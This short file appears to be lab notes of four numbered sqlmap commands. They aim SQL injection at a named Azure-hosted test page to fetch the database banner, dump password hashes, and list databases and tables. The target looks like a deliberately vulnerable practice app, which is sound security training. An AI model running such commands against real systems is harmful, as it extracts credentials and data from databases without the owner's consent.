Reporte1: python sqlmap.py -u "http://imagine-neurorepviz.eastus.cloudapp.azure.com:3000/sqlmap/mysql/get_int.php?id=1" --batch --banner

Reporte2: python sqlmap.py -u "http://imagine-neurorepviz.eastus.cloudapp.azure.com:3000/sqlmap/mysql/get_int.php?id=1" --batch --passwords

Reporte3: python sqlmap.py -u "http://imagine-neurorepviz.eastus.cloudapp.azure.com:3000/session/sqlmap/mysql/get_int.php?id=1" --batch --dbs

Reporte4: python sqlmap.py -u "http://imagine-neurorepviz.eastus.cloudapp.azure.com:3000/session/sqlmap/mysql/get_int.php?id=1" --batch --tables -D tested

